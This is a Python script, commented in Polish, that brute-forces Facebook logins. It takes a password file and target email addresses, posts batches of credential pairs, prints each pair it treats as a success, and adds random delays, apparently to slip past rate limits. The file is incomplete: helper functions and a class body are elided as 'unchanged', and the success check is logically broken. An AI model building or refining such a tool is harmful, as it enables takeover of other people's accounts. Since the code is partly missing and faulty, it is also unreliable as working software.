import time
import requests
import sys
import random  # Dodane dla generowania losowego opóźnienia

WAIT_TIME = 5
PASSWD_PER_REQUEST = 1000
DELAY_RANGE = (2, 5)  # Zakres opóźnienia w sekundach

class bcolors:
    # ... (bez zmian)

# ... (bez zmian)

def send_request(url, data):
    req = requests.post(url, data.encode('utf-8'))
    rsp = req.content.decode('utf-8')
    return rsp

# ... (bez zmian)

def attack(entries, url):
    if len(entries) < 1:
        return

    t = template(entries)
    response = send_request(url, t)

    # Check if any successful logins were found
    for entry in entries:
        if "Welcome to Facebook" in response:
            print(bcolors.OKGREEN + "Login successful!" + bcolors.ENDC)
            print(bcolors.OKGREEN + "Email: " + entry.get('email') + " Password: " + entry.get('passwd') + bcolors.ENDC)
        else:
            print(bcolors.FAIL + "Login failed!" + bcolors.ENDC)
            print(bcolors.FAIL + "Email: " + entry.get('email') + " Password: " + entry.get('passwd') + bcolors.ENDC)

        # Dodane opóźnienie
        time.sleep(random.uniform(DELAY_RANGE[0], DELAY_RANGE[1]))

def brute_force(url, passwords, emails):
    entries = []

    for email in emails:
        for password in passwords:
            entries.append({'email': email, 'passwd': password})
            if len(entries) >= PASSWD_PER_REQUEST:
                attack(entries, url)
                entries = []

    # Attack remaining entries
    attack(entries, url)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        banner(sys.argv, usage=True)

    url = sys.argv[1]
    passwords_file = sys.argv[2]
    emails = sys.argv[3:]

    with open(passwords_file, 'r') as file:
        passwords = [line.strip() for line in file]

    banner(sys.argv, url=url, emails=emails)

    brute_force(url, passwords, emails)
